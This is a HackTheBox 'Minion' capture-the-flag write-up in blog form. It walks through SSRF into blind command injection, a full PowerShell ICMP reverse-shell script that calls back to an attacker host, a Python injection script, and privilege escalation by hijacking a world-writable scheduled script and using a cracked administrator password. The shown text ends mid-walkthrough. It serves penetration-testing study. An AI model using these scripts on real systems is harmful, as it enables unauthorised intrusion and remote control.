<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>HackTheBox - Minion</title>
  <meta name="description" content="Service Scanning">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/pentesting/ctf/2018/03/21/HackTheBox-Minion.html">
  <link rel="alternate" type="application/rss+xml" title="...and another security blog" href="http://localhost:4000/feed.xml">
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">...and another security blog</a>

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      <div class="trigger">
        
          
        
          
        
          
        
          
        
          
        
      </div>
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">HackTheBox - Minion</h1>
    <p class="post-meta"><time datetime="2018-03-21T11:35:00-07:00" itemprop="datePublished">Mar 21, 2018</time></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <h2 id="service-scanning">Service Scanning</h2>

<p>Starting with:</p>

<p><code>nmap -T4 -Pn -oA nmap/initial_scan 10.10.10.57</code></p>

<p>This scan didn’t return any open port. I then executed a wider scan, on all possible TCP ports:</p>

<p><code>nmap -T4 -Pn -p- -oA nmap/second_scan 10.10.10.57</code></p>

<p>Only a open TCP port was reported:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">PORT      STATE SERVICE
62696/tcp open  unknown</code></pre></figure>

<p>Scanning for its version with <code>nmap -sV -p62696 10.10.10.57</code>, showed the follow information:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">PORT      STATE SERVICE VERSION
62696/tcp open  http    Microsoft IIS httpd 8.5</code></pre></figure>

<p>As this seemed to be an IIS webserver, I fired my browser and went to 10.10.10.57:62696.</p>

<h2 id="web-server-enumeration">Web Server Enumeration</h2>

<p>I saw a website called “Welcome to Minions Fanclub Site!”. The visible content didn’t seem to be useful, so I decided to have a look at the HTML source code. I then quickly saw what looked to be a base64 value:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="c">&lt;!-- TmVsIG1lenpvIGRlbCBjYW1taW4gZGkgbm9zdHJhIHZpdGENCm1pIHJpdHJvdmFpIHBlciB1bmEgc2VsdmEgb3NjdXJhLA0KY2jDqSBsYSBkaXJpdHRhIHZpYSBlcmEgc21hcnJpdGEu --&gt;</span></code></pre></figure>

<p>I go ahead and decode the value and get the plain text value:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'TmVsIG1lenpvIGRlbCBjYW1taW4gZGkgbm9zdHJhIHZpdGENCm1pIHJpdHJvdmFpIHBlciB1bmEgc2VsdmEgb3NjdXJhLA0KY2jDqSBsYSBkaXJpdHRhIHZpYSBlcmEgc21hcnJpdGEu'</span> |base64 <span class="nt">-d</span>
Nel mezzo del cammin di nostra vita
mi ritrovai per una selva oscura,
ché la diritta via era smarrita.</code></pre></figure>

<p>I was able to understand a bit of the Italian, but translated to English:</p>

<pre>
In the middle of the walk of our life
I found myself in a dark forest,
because the straight way was lost.
</pre>

<p>This text didn’t tell me anything straight away, so saved it and kept digging for more.</p>

<p>Going to <code>http://10.10.10.57:62696/robots.txt</code>, I learned the directory /backend was disallowed. Going to <code>http://10.10.10.57:62696/backend/</code> only resulted in the HTML response “Instance not running”.</p>

<p>To enumerate directories and files, I launched dirb:</p>

<p><code>dirb http://10.10.10.57:62696 /usr/share/wordlists/dirb/common.txt</code></p>

<p>Other than the /backend directory, nothing else stood out. I went ahead and this time used gobuster. This way I could increase the number of threads, so it could be faster. I also used a couple of Microsoft Web related extensions:</p>

<p><code>gobuster -t 50 -u http://10.10.10.57:62696/ -w /usr/share/wordlists/dirb/common.txt -x .asp,.txt,.bak,.sql,.aspx,.mdb,.log,.reg</code></p>

<p>This time, I got the file test.asp. After going to <code>http://10.10.10.57:62696/test.asp</code>, I get a response saying “Missing Parameter Url [u] in GET request!”. At this time, I thought leveraging this to access any internal website. I went ahead and submitted the following request: <code>http://10.10.10.57:62696/test.asp?u=http://127.0.0.1</code></p>

<p>I got a Site Administration webpage, with a couple of useless links, but with a useful one saying “system commands”. This one linked to <code>http://127.0.0.1/cmd.aspx</code>. I then requested <code>http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx</code> and I got a textbox with label “Enter your shell command”. There was no submit button, but by pressing enter, the form would be submitted by POST to the same URL cmd.aspx. Because I was running these requests through the test.asp proxy, I couldn’t simply just submit the form on the browser, because it would submit it to <code>http://10.10.10.57:62696/cmd.aspx</code> and that wouldn’t work. However, I just tried to submit a GET request and it worked! So submitting <code>http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=whoami</code>, would give me a response HTML webpage with Exit Status=0 on its body. This revealed the command was successful, but I was not received the output of it. I was facing a blind OS command injection scenario.</p>

<h2 id="getting-a-foothold">Getting a Foothold</h2>

<p>Since this was a Windows machine, my first thought was to run a Powershell command to download and execute a meterpreter shell. Just to test it, I launched a webserver (python -m SimpleHTTPServer) on my attacking box and ran the command <code>powershell -c (new-object System.Net.WebClient).DownloadFile('http://MY_ATTACKER_IP','test_file.txt')</code>. However, I didn’t get a connection back to my webserver. I tried a few variants of the command, bypassing the restriction policy (-exec bypass), URL encoding and double encoding, but nothing worked. I was always getting the Exit Status=1, which meant the command failed. I then launched a tcpdump on my machine and ran the ping command through the URL <code>http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=ping -c 3 MY_ATTACKER_IP</code>. I got three ping requests on my tcpdump’s output! This meant the machine was only allowing ping network traffic (ICMP Echo Requests and Replies) and it seems I was restricted to use a ICMP shell.</p>

<p>After some research, I quickly found the <a href="https://github.com/inquisb/icmpsh">icmpsh shell</a> and the Powershell client <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">Invoke-PowershellShellIcmp.ps1</a>. I used <a href="https://pentestlab.blog/tag/icmpsh/">this</a> reference. The icmpsh I would run in my attacker box and the Invoke-PowerShellIcmp.ps1 on the target machine. Because I was not allowed to download any files, my only option was to build the file through the use of echo commands. My plan was once the file was built on the target system, I would launch a powershell command to execute it. After trying a few times manually, using Burp proxy, I decided to automate the process by writing a Python script. Then my nightmare started. I spent several days fighting with URL and shell encodings. I knew that I had to URL encode at least one time the value of parameter xcmd, however, I found out later, the value passed to the echo command, also needed some especial escaping. I used <a href="https://sites.google.com/site/opensourceconstriubtions/ettl-martin-1/tutorials/how-to-escape-special-characters-in-windows-batch-files-when-using-echo">this</a> reference. The especial characters of the Powershell code of Invoke-PowerShellIcmp.ps1 were breaking the echo command and make the request return the Exit Status=1. I then decided that it would be easier to convert the Invoke-PonvwerShellIcmp.ps1 file to base64 and use that as the value for the echo commands. I also minimized the code in Invoke-PowerShellIcmp.ps1, by removing comments and blank lines. Also, to avoid having to run another Powershell command, I added Invoke-PowerShellIcmp MY_ATTACKER_IP to the end of Invoke-PowerShellIcmp.ps1. The final result was:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="k">function </span>Invoke-PowerShellIcmp
<span class="o">{</span>
<span class="o">[</span><span class="na">CmdletBinding</span><span class="o">()]</span> <span class="k">Param</span><span class="o">(</span>
<span class="o">[</span>Parameter<span class="o">(</span>Position <span class="o">=</span> 0, Mandatory <span class="o">=</span> <span class="nv">$true</span><span class="o">)]</span>
<span class="o">[</span><span class="kt">String</span><span class="o">]</span>
<span class="nv">$IPAddress</span>,
<span class="o">[</span>Parameter<span class="o">(</span>Position <span class="o">=</span> 1, Mandatory <span class="o">=</span> <span class="nv">$false</span><span class="o">)]</span>
<span class="o">[</span><span class="kt">Int</span><span class="o">]</span>
<span class="nv">$Delay</span> <span class="o">=</span> 5,
<span class="o">[</span>Parameter<span class="o">(</span>Position <span class="o">=</span> 2, Mandatory <span class="o">=</span> <span class="nv">$false</span><span class="o">)]</span>
<span class="o">[</span><span class="kt">Int</span><span class="o">]</span>
<span class="nv">$BufferSize</span> <span class="o">=</span> 128
<span class="o">)</span>
<span class="nv">$ICMPClient</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Net.NetworkInformation.Ping
<span class="nv">$PingOptions</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Net.NetworkInformation.PingOptions
<span class="nv">$PingOptions</span>.DontFragment <span class="o">=</span> <span class="nv">$True</span>
<span class="nv">$sendbytes</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="s2">"Windows PowerShell running as user "</span> + <span class="nv">$env</span>:username + <span class="s2">" on "</span> + <span class="nv">$env</span>:computername + <span class="s2">"</span><span class="se">`n</span><span class="s2">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><span class="se">`n`n</span><span class="s2">"</span><span class="o">)</span>
<span class="nv">$ICMPClient</span>.Send<span class="o">(</span><span class="nv">$IPAddress</span>,60 <span class="k">*</span> 1000, <span class="nv">$sendbytes</span>, <span class="nv">$PingOptions</span><span class="o">)</span> | Out-Null
<span class="nv">$sendbytes</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="s1">'PS '</span> + <span class="o">(</span><span class="nb">Get-Location</span><span class="o">)</span>.Path + <span class="s1">'&gt; '</span><span class="o">)</span>
<span class="nv">$ICMPClient</span>.Send<span class="o">(</span><span class="nv">$IPAddress</span>,60 <span class="k">*</span> 1000, <span class="nv">$sendbytes</span>, <span class="nv">$PingOptions</span><span class="o">)</span> | Out-Null
<span class="k">while</span> <span class="o">(</span><span class="nv">$true</span><span class="o">)</span>
<span class="o">{</span>
<span class="nv">$sendbytes</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="s1">''</span><span class="o">)</span>
<span class="nv">$reply</span> <span class="o">=</span> <span class="nv">$ICMPClient</span>.Send<span class="o">(</span><span class="nv">$IPAddress</span>,60 <span class="k">*</span> 1000, <span class="nv">$sendbytes</span>, <span class="nv">$PingOptions</span><span class="o">)</span>
<span class="k">if</span> <span class="o">(</span><span class="nv">$reply</span>.Buffer<span class="o">)</span>
<span class="o">{</span>
<span class="nv">$response</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$reply</span>.Buffer<span class="o">)</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="o">(</span><span class="nb">Invoke-Expression</span> -Command <span class="nv">$response</span> 2&gt;&amp;1 | <span class="nb">Out-String</span> <span class="o">)</span>
<span class="nv">$sendbytes</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$result</span><span class="o">)</span>
<span class="nv">$index</span> <span class="o">=</span> <span class="o">[</span>math]::floor<span class="o">(</span><span class="nv">$sendbytes</span>.length/<span class="nv">$BufferSize</span><span class="o">)</span>
<span class="nv">$i</span> <span class="o">=</span> 0
<span class="k">if</span> <span class="o">(</span><span class="nv">$sendbytes</span>.length -gt <span class="nv">$BufferSize</span><span class="o">)</span>
<span class="o">{</span>
<span class="k">while</span> <span class="o">(</span><span class="nv">$i</span> -lt <span class="nv">$index</span> <span class="o">)</span>
<span class="o">{</span>
<span class="nv">$sendbytes2</span> <span class="o">=</span> <span class="nv">$sendbytes</span><span class="o">[(</span><span class="nv">$i</span><span class="k">*</span><span class="nv">$BufferSize</span><span class="o">)</span>..<span class="o">((</span><span class="nv">$i</span>+1<span class="o">)</span><span class="k">*</span><span class="nv">$BufferSize</span>-1<span class="o">)]</span>
<span class="nv">$ICMPClient</span>.Send<span class="o">(</span><span class="nv">$IPAddress</span>,60 <span class="k">*</span> 10000, <span class="nv">$sendbytes2</span>, <span class="nv">$PingOptions</span><span class="o">)</span> | Out-Null
<span class="nv">$i</span> +<span class="o">=</span>1
<span class="o">}</span>
<span class="nv">$remainingindex</span> <span class="o">=</span> <span class="nv">$sendbytes</span>.Length % <span class="nv">$BufferSize</span>
<span class="k">if</span> <span class="o">(</span><span class="nv">$remainingindex</span> -ne 0<span class="o">)</span>
<span class="o">{</span>
<span class="nv">$sendbytes2</span> <span class="o">=</span> <span class="nv">$sendbytes</span><span class="o">[(</span><span class="nv">$i</span><span class="k">*</span><span class="nv">$BufferSize</span><span class="o">)</span>..<span class="o">(</span><span class="nv">$sendbytes</span>.Length<span class="o">)]</span>
<span class="nv">$ICMPClient</span>.Send<span class="o">(</span><span class="nv">$IPAddress</span>,60 <span class="k">*</span> 10000, <span class="nv">$sendbytes2</span>, <span class="nv">$PingOptions</span><span class="o">)</span> | Out-Null
<span class="o">}</span>
<span class="o">}</span>
<span class="k">else</span>
<span class="o">{</span>
<span class="nv">$ICMPClient</span>.Send<span class="o">(</span><span class="nv">$IPAddress</span>,60 <span class="k">*</span> 10000, <span class="nv">$sendbytes</span>, <span class="nv">$PingOptions</span><span class="o">)</span> | Out-Null
<span class="o">}</span>
<span class="nv">$sendbytes</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="s2">"</span><span class="se">`n</span><span class="s2">PS "</span> + <span class="o">(</span><span class="nb">Get-Location</span><span class="o">)</span>.Path + <span class="s1">'&gt; '</span><span class="o">)</span>
<span class="nv">$ICMPClient</span>.Send<span class="o">(</span><span class="nv">$IPAddress</span>,60 <span class="k">*</span> 1000, <span class="nv">$sendbytes</span>, <span class="nv">$PingOptions</span><span class="o">)</span> | Out-Null
<span class="o">}</span>
<span class="k">else</span>
<span class="o">{</span>
<span class="nb">Start-Sleep</span> -Seconds <span class="nv">$Delay</span>
<span class="o">}</span>
<span class="o">}</span>
<span class="o">}</span>
invoke-powershellicmp MY_ATTACKER_IP</code></pre></figure>

<p>After running <code>base64 Invoke-PowerShellIcmp.ps1 &gt; Invoke-PowerShellIcmp.b64</code>, I wrote the following Python 2 script that automates the process:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">urllib2</span>
<span class="kn">import</span> <span class="nn">urllib</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="k">def</span> <span class="nf">send_request</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">request</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">regex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'Status=(</span><span class="err">\</span><span class="s">d+)'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">regex</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">regex</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
                <span class="k">print</span> <span class="s">"[</span><span class="si">%</span><span class="s">d] =&gt; </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">code</span><span class="p">,</span><span class="n">regex</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
                <span class="k">print</span> <span class="s">"</span><span class="se">\t</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">url</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="s">"[</span><span class="si">%</span><span class="s">d]"</span> <span class="o">%</span> <span class="n">response</span><span class="o">.</span><span class="n">code</span>
        <span class="n">response</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPError</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"Failed </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">error</span><span class="o">.</span><span class="n">code</span>
        <span class="k">pass</span>

<span class="n">base64_file</span> <span class="o">=</span> <span class="s">'Invoke-PowerShellIcmp.b64'</span>
<span class="n">url2</span> <span class="o">=</span> <span class="s">"http://127.0.0.1/cmd.aspx?xcmd="</span>
<span class="n">url1</span> <span class="o">=</span> <span class="s">"http://10.10.10.57:62696/test.asp?u="</span>

<span class="c">#############################</span>
<span class="k">print</span> <span class="s">"Building </span><span class="se">\\</span><span class="s">temp</span><span class="err">\</span><span class="s">s.b64"</span>
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">base64_file</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">new_line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">redir</span> <span class="o">=</span> <span class="s">'&gt;'</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">redir</span> <span class="o">=</span> <span class="s">'&gt;&gt;'</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="s">"echo </span><span class="si">%</span><span class="s">s </span><span class="si">%</span><span class="s">s </span><span class="se">\\</span><span class="s">temp</span><span class="err">\</span><span class="s">s.b64"</span> <span class="o">%</span> <span class="p">(</span><span class="n">new_line</span><span class="p">,</span><span class="n">redir</span><span class="p">)</span>
    <span class="n">send_request</span><span class="p">(</span><span class="n">url1</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">url2</span><span class="p">)</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c">######################################################</span>
<span class="k">print</span> <span class="s">'Decoding </span><span class="se">\\</span><span class="s">temp</span><span class="err">\</span><span class="s">s.b64 and writing </span><span class="se">\\</span><span class="s">temp</span><span class="err">\</span><span class="s">s.ps1'</span>
<span class="n">send_request</span><span class="p">(</span><span class="n">url1</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">url2</span><span class="p">)</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s">"powershell -c </span><span class="se">\"</span><span class="s">[system.text.encoding]::ASCII.getstring([system.convert]::frombase64string((gc </span><span class="se">\\</span><span class="s">temp</span><span class="err">\</span><span class="s">s.b64)))|out-file </span><span class="se">\\</span><span class="s">temp</span><span class="err">\</span><span class="s">s.ps1</span><span class="se">\"</span><span class="s">"</span><span class="p">))</span>

<span class="c">#############################</span>
<span class="k">print</span> <span class="s">'Executing </span><span class="se">\\</span><span class="s">temp</span><span class="err">\</span><span class="s">s.ps1'</span>
<span class="n">send_request</span><span class="p">(</span><span class="n">url1</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">url2</span><span class="p">)</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s">"powershell -c </span><span class="se">\\</span><span class="s">temp</span><span class="err">\</span><span class="s">s.ps1"</span><span class="p">))</span></code></pre></figure>

<p><b>Note:</b> For the base64 decoding, I could have used certutil utility as well.</p>

<p>On my attacking box, I launched the icmpsh with <code>icmpsh_m.py MY_ATTACK_IP 10.10.10.57</code> and executed the Python script. After a while I got a Powershell command prompt:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/icmpsh-master# ./icmpsh_m.py 10.10.17.241 10.10.10.57
Windows PowerShell running as user MINION<span class="nv">$ </span>on MINION
Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; whoami
iis apppool<span class="se">\d</span>efaultapppool

PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;</code></pre></figure>

<h2 id="system-enumeration">System Enumeration</h2>

<p>I quickly noticed the user iis apppool\defaultapppool was not having all the permissions that I needed. Listing the directory \users, I could see two users: Administrator and decoder.minion. I then found the directory c:\sysadmscripts containing the files c.ps1 and del_logs.bat. Reading the files’ content, I learned the c.ps1 Powershell script was most likely being ran each 5 minutes. From the del_logs.bat I saw there was a log file being written at \windows\temp\log.txt. I could see the output written in each 5 minutes. I also noticed that c.ps1 was writable by everyone, so my low privilege user could write into it. I then executed the following command to overwrite the file, so that its next execution would give me the contents of the directory \users\decoder.minion:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nb">write-output</span> <span class="s2">"get-childitem \users\decoder.minion\Desktop | out-file \temp\log.txt"</span> | <span class="nb">out-file</span> \sysadmscripts\c.ps1</code></pre></figure>

<p>After 5 minutes, the content of \temp\log.txt was:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span>C:\&gt; <span class="nb">cat</span> \temp\log.txt
  Directory: C:\users\decoder.minion\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          9/4/2017   7:19 PM     103297 backup.zip                        
-a---         8/25/2017  11:09 AM         33 user.txt       </code></pre></figure>

<p>Following the same process, I copied both files to \temp, where I would have permissions to read them:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nb">write-output</span> <span class="s2">"cat \users\decoder.minion\desktop\user.txt | out-file \temp\user.txt"</span> | <span class="nb">out-file</span> \sysadmscripts\c.ps1</code></pre></figure>

<p>I was able to see the user.txt with <code>cat \temp\user.txt</code>.</p>

<p>I then copied the backup.zip file:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nb">write-output</span> <span class="s2">"copy-item \users\decoder.minion\desktop\backup.zip -destination \temp\backup.zip"</span> | <span class="nb">out-file</span> \sysadmscripts\c.ps1</code></pre></figure>

<p>I then actually unzipped the backup.zip file using Powershell (<a href="https://serverfault.com/questions/446884/unzip-file-with-powershell-in-server-2012-core">Reference</a>):</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="o">[</span>System.Reflection.Assembly]::LoadWithPartialName<span class="o">(</span><span class="s2">"System.IO.Compression.FileSystem"</span><span class="o">)</span> | Out-Null
<span class="o">[</span>System.IO.Compression.ZipFile]::ExtractToDirectory<span class="o">(</span><span class="s2">"\temp\backup.zip"</span>,<span class="s2">"\temp"</span><span class="o">)</span>

<span class="nb">PS </span>C:\sysadmscripts&gt; <span class="nb">get-childitem</span> \temp


    Directory: C:\temp


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          9/4/2017   7:14 PM     386130 secret.exe                        </code></pre></figure>

<p>Running secret.exe, I just get the current working directory. Nothing special about it. I actually encoded the file in base64 so I could copy paste it and reproduce it on my own machine:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$base64string</span> <span class="o">=</span> <span class="o">[</span>Convert]::ToBase64String<span class="o">([</span>IO.File]::ReadAllBytes<span class="o">(</span><span class="s1">'\temp\backup.zip'</span><span class="o">))</span>
<span class="nv">$base64string</span></code></pre></figure>

<p>I took a while to print all the base64 content. I then copied all base64 output from the screen and pasted into vi in my attacker box. By decoding this file using the command base64 -d, I was able to get the original secret.exe. Ran strings against it, but nothing stood out.</p>

<p>I then remembered to check the Alternate Data Stream for the backup.zip file and I found a stream called “pass”:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nb">get-item</span> \temp\backup.zip -stream <span class="k">*</span>

FileName: C:\temp\backup.zip

Stream                   Length
------                   ------
:<span class="nv">$DATA</span>                   103297
pass                         34</code></pre></figure>

<p>Getting the content of the stream, gave me a hash, which looked like a MD5 or most likely a NTLM:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nb">cat</span> \temp\backup.zip -stream pass
28a5d1e0c15af9f8fce7db65d75bbf17</code></pre></figure>

<h2 id="own-system">Own System</h2>

<p>Using <a href="https://hashkiller.co.uk/md5-decrypter.aspx">Hashkiller</a>, I was able to crack the hash:</p>

<p><b>28a5d1e0c15af9f8fce7db65d75bbf17 NTLM : 1234test</b></p>

<p>This was most certainly the password for the administrator user. I tried the following command to get the Administrator’s Desktop directory contents:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$username</span> <span class="o">=</span> <span class="s1">'administrator'</span>; <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'1234test'</span>; <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">ConvertTo-SecureString</span> -AsPlainText <span class="nv">$Password</span> -Force; <span class="nv">$cred</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Management.Automation.PSCredential <span class="nv">$username</span>, <span class="nv">$pass</span>; Invoke-Command -ComputerName localhost -credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> <span class="nb">Get-ChildItem</span> \users\administrator\desktop <span class="o">}</span></code></pre></figure>

<p>I used the Invoke-Command and built the PSCredential object using the password. However, as I was running as the low privileged IIS user, this command was not returning nothing. I never got certain of the exact reason, but I presumed the IIS user was not allowed to run Invoke-Command passing other user’s credentials. So, I had to change my previous Python script to copy the ICMP shell to \sysadmscripts\c.ps1, so that I could get a shell under decoder user. The change was easy, as instead of copying the Invoke-PowerShellIcmp.ps1 to \temp\s.ps1, I copied to \sysadmscripts\c.ps1. I also commented the execution of the shell as I just wanted it to be triggered by the decoder’s scheduled task.</p>

<p>After 5 minutes, I got a shell back under the user decoder. I then proceeded to run the Invoke-command again and this time I got the contents of the Administrator’s desktop directory:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$username</span> <span class="o">=</span> <span class="s1">'administrator'</span>; <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'1234test'</span>; <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">ConvertTo-SecureString</span> -AsPlainText <span class="nv">$Password</span> -Force; <span class="nv">$cred</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Management.Automation.PSCredential <span class="nv">$username</span>, <span class="nv">$pass</span>; Invoke-Command -ComputerName localhost -credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> <span class="nb">Get-ChildItem</span> \users\administrator\desktop <span class="o">}</span>

Directory: C:\users\administrator\desktop


Mode                LastWriteTime     Length Name              PSComputerName  
----                -------------     ------ ----              --------------  
-a---         9/26/2017   6:18 AM     386479 root.exe          localhost       
-a---         8/24/2017  12:32 AM         76 root.txt          localhost       </code></pre></figure>

<p>At that time I thought the challenge was done as the next step would just to get the root.txt content. However, when running the command, I learned the root.txt was not containing what I wanted:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$username</span> <span class="o">=</span> <span class="s1">'administrator'</span>; <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'1234test'</span>; <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">ConvertTo-SecureString</span> -AsPlainText <span class="nv">$Password</span> -Force; <span class="nv">$cred</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Management.Automation.PSCredential <span class="nv">$username</span>, <span class="nv">$pass</span>; Invoke-Command -ComputerName localhost -credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> <span class="nb">cat</span>\users\administrator\desktop\root.txt <span class="o">}</span>

<span class="k">In </span>order to get the flag you have to launch root.exe located <span class="k">in </span>this folder!</code></pre></figure>

<p>Ok, so I then ran the root.exe executable:</p>

